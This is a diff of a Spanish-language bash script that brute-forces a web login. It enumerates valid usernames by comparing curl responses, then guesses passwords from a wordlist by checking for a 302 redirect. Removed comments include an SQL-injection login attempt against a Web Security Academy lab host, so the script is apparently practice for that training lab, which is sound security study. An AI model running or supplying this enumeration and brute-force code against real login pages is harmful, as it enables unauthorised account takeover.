@@ -4,6 +4,8 @@ start=1
 URL=$(echo -e "$url")
 echo "Dime un usuario o un fichero txt con un listado de usuarios"
 read document
+#añadir a.txt
+
 if [ -f  $document ]
 then
     echo "Recuerda que este proceso puede tardar minutos."
@@ -11,7 +13,6 @@ then
     while [ $start -le $total ]
         do
         test=$(awk "NR==$start{print $1}" $document)
-    #    curl -s -d "csrf=!284453q&username=administrator'--&password=a" https://ac011f251f062c74c0fb0f6f009a0020.web-security-academy.net/login 
         if [[ $(curl -s -d "username=$test&password=a" $URL) != $(curl -s -d "username=a&password=a" $URL) ]]
         then
             echo -e "El usuario és $test"
@@ -22,7 +23,7 @@ then
     #    echo $start
     done
 else
-    if [[! $(curl --verbose -s -d "username=$document&password=a" $URL) != $(curl -s -d "username=a&password=a" $URL) ]]
+    if [[! $(curl -s -d "username=$document&password=a" $URL) != $(curl -s -d "username=a&password=a" $URL) ]]
         then
             echo -e "username is $document"
             username=$test
@@ -42,13 +43,15 @@ then
     echo "Fichero valido"
 else
     echo "El Fichero no es valido, usaremos un diccionario propio"
+    
+    #añadir rockyou.txt
+    
     document= b.txt
 start=1
 total=$(wc -l < $document)
 while [ $start -le $total ]
     do
     test=$(awk "NR==$start{print $1}" $document)
-    #    curl -s -d "username=$test&password=a" https://ac011f251f062c74c0fb0f6f009a0020.web-security-academy.net/login 
     if ! [[ $(curl -i -s -d "username=$username&password=$test" $URL | grep -e "302 Found") ]]
     then
         echo -e "La contrasenya és $test"
